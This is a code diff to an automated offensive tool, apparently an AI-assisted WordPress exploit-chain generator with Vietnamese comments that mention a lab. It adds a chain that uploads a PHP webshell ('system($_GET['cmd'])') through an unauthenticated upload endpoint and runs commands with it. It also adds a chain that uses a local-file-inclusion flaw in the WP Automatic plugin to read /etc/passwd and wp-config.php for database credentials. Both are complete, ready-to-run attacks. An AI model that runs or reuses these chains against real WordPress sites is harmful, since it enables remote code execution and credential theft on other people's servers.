+            json_pattern = r'\{[\s\S]*?"entry_point"[\s\S]*?\}'
+            json_matches = re.findall(json_pattern, response, re.DOTALL)
             
             for match in json_matches:
                 try:
                     chain_data = json.loads(match)
                     
-                    # Build steps
-                    steps = []
-                    for step_text in chain_data.get('steps', []):
-                        steps.append(ExploitStep(
-                            name=step_text,
-                            action=step_text,
-                            target="target",
-                            success_indicator="success"
-                        ))
+                    # Get entry point and ensure it has proper URL
+                    entry_point = chain_data.get('entry_point', '')
+                    if entry_point and not entry_point.startswith(('http://', 'https://')):
+                        entry_point = self._build_full_url(entry_point)
                     
-                    # Build chain
-                    chain = ExploitChain(
-                        name=chain_data.get('technique', 'ai_generated_chain'),
-                        description=chain_data.get('expected_impact', ''),
-                        steps=steps,
-                        risk_level="HIGH",
-                        prerequisites=[chain_data.get('entry_point', '')],
-                        postconditions=[chain_data.get('expected_impact', '')]
-                    )
-                    chains.append(chain)
-                except (json.JSONDecodeError, KeyError):
+                    # Build steps with proper targets
+                    steps = []
+                    for step_data in chain_data.get('steps', []):
+                        if isinstance(step_data, dict):
+                            step_name = step_data.get('name', step_data.get('action', 'Unknown Step'))
+                            step_target = step_data.get('target', entry_point)
+                            
+                            # Ensure target has proper URL
+                            if step_target and not step_target.startswith(('http://', 'https://')):
+                                step_target = self._build_full_url(step_target)
+                            
+                            # Skip if target is empty
+                            if not step_target:
+                                step_target = base_url
+                            
+                            steps.append(ExploitStep(
+                                name=step_name,
+                                action=step_data.get('action', step_name),
+                                target=step_target,
+                                tool=step_data.get('tool', 'curl'),
+                                payload=step_data.get('payload', ''),
+                                success_indicator=step_data.get('success_indicator', 'success'),
+                                preconditions=step_data.get('preconditions', []),
+                                postconditions=step_data.get('postconditions', [])
+                            ))
+                        elif isinstance(step_data, str):
+                            # Handle string steps
+                            steps.append(ExploitStep(
+                                name=step_data,
+                                action=step_data,
+                                target=entry_point or base_url,
+                                success_indicator="success"
+                            ))
+                    
+                    # Only add chain if it has valid steps
+                    if steps and entry_point:
+                        chain = ExploitChain(
+                            name=chain_data.get('technique', 'ai_generated_chain'),
+                            description=chain_data.get('expected_impact', ''),
+                            steps=steps,
+                            risk_level="HIGH",
+                            prerequisites=[entry_point] if entry_point else [],
+                            postconditions=[chain_data.get('expected_impact', '')],
+                            preconditions=chain_data.get('preconditions', [])
+                        )
+                        chains.append(chain)
+                        logger.debug(f"[CHAIN] Parsed chain: {chain.name} with {len(steps)} steps")
+                    else:
+                        logger.warning(f"[CHAIN] Skipping invalid chain - no entry_point or steps")
+                        
+                except (json.JSONDecodeError, KeyError) as e:
+                    logger.debug(f"[CHAIN] Failed to parse chain data: {e}")
                     continue
         except Exception as e:
-            logger.debug(f"[CHAIN] Failed to parse AI response: {e}")
+            logger.error(f"[CHAIN] Failed to parse AI response: {e}")
         
         return chains
 
@@ -1891,9 +2593,10 @@ Format each chain as JSON with:
                 ExploitStep(
                     name="User Enumeration",
                     action="enumerate_wp_users",
-                    target=self._build_full_url("wp-json/wp/v2/users"),
+                    # Dùng ?author=1 thay vì REST API vì /wp-json/wp/v2/users hay bị 404
+                    target=self._build_full_url("?author=1"),
                     tool="curl",
-                    success_indicator="user list extracted",
+                    success_indicator="author",
                     priority=10,
                 ),
                 ExploitStep(
@@ -2334,6 +3037,107 @@ Format each chain as JSON with:
             ]
         )
 
+    def _build_direct_upload_rce_chain(self, endpoint: Dict) -> ExploitChain:
+        """
+        Chain khai thác trực tiếp vuln-upload.php — không cần bypass filter.
+        Lab này cho phép upload PHP trực tiếp, uploads/ có thể execute PHP.
+        """
+        upload_url = endpoint.get("url", "")
+        if not upload_url.startswith(('http://', 'https://')):
+            upload_url = self._build_full_url(upload_url)
+
+        # Xác định base URL để build đường dẫn shell sau khi upload
+        base = self._get_base_url()
+        shell_url = f"{base}/wp-content/uploads/shell.php"
+
+        return ExploitChain(
+            name="Unauthenticated File Upload → Direct RCE",
+            description="Upload PHP webshell trực tiếp qua endpoint không xác thực, execute lệnh qua uploads/",
+            risk_level="CRITICAL",
+            estimated_time="2-5 min",
+            prerequisites=["vuln-upload.php accessible"],
+            preconditions=["no authentication required", "uploads directory executable"],
+            postconditions=["code_execution", "remote_shell"],
+            steps=[
+                ExploitStep(
+                    name="Probe upload endpoint",
+                    action="probe_endpoint",
+                    target=upload_url,
+                    tool="curl",
+                    success_indicator="200",
+                    priority=10,
+                ),
+                ExploitStep(
+                    name="Upload PHP webshell",
+                    action="upload_webshell",
+                    target=upload_url,
+                    tool="curl",
+                    payload="<?php system($_GET['cmd']); ?>",
+                    depends_on=["Probe upload endpoint"],
+                    success_indicator="File uploaded successfully",
+                    priority=9,
+                ),
+                ExploitStep(
+                    name="Execute RCE via webshell",
+                    action="trigger_webshell",
+                    target=shell_url,
+                    tool="curl",
+                    payload="?cmd=id",
+                    depends_on=["Upload PHP webshell"],
+                    success_indicator="uid=",
+                    priority=8,
+                    postconditions=["code_execution"]
+                ),
+            ]
+        )
+
+    def _build_wp_automatic_lfi_chain(self, endpoint: Dict) -> ExploitChain:
+        """
+        Chain khai thác LFI trong WP Automatic plugin.
+        Plugin dùng include($action) trực tiếp không validate.
+        """
+        base = self._get_base_url()
+        plugin_url = f"{base}/wp-content/plugins/wp-automatic/wp-automatic.php"
+
+        return ExploitChain(
+            name="WP Automatic Plugin LFI → Config Disclosure",
+            description="Khai thác Local File Inclusion trong WP Automatic để đọc wp-config.php và lấy DB credentials",
+            risk_level="CRITICAL",
+            estimated_time="2-5 min",
+            prerequisites=["wp-automatic plugin installed"],
+            preconditions=["no authentication required"],
+            postconditions=["information_disclosure", "data_exfiltration"],
+            steps=[
+                ExploitStep(
+                    name="Verify LFI via /etc/passwd",
+                    action="test_lfi",
+                    target=f"{plugin_url}?wp_automatic_action=/etc/passwd",
+                    tool="curl",
+                    success_indicator="root:x:",
+                    priority=10,
+                ),
+                ExploitStep(
+                    name="Read wp-config.php",
+                    action="read_wp_config",
+                    target=f"{plugin_url}?wp_automatic_action=/var/www/html/wp-config.php",
+                    tool="curl",
+                    depends_on=["Verify LFI via /etc/passwd"],
+                    success_indicator="DB_PASSWORD",
+                    priority=9,
+                ),
+                ExploitStep(
+                    name="Extract DB credentials",
+                    action="extract_credentials",
+                    target=f"{plugin_url}?wp_automatic_action=/var/www/html/wp-config.php",
+                    tool="curl",
+                    depends_on=["Read wp-config.php"],
+                    success_indicator="DB_USER",
+                    priority=8,
+                    postconditions=["information_disclosure"]
+                ),
+            ]
+        )
+
     def format_chain_report(self, chains: List[ExploitChain]) -> str:
         """Format chains into readable report"""
         lines = [
@@ -2380,6 +3184,8 @@ for _method_name in [
     "_build_xmlrpc_chain",
     "_build_sqli_chain",
     "_build_upload_chain",
+    "_build_direct_upload_rce_chain",
+    "_build_wp_automatic_lfi_chain",
     "_build_lfi_chain",
     "_build_xss_chain",
     "_build_wp_plugin_chain",
